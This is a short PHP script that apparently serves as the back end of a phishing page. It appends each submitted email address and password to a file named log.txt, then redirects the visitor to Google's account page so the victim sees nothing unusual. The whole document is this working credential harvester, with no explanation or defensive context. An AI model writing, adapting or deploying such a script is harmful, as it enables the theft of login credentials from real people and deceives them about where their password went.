<?php
$file = 'log.txt';
$fp = fopen($file , 'a');
file_put_contents("log.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.google.com/account/about/');
exit();
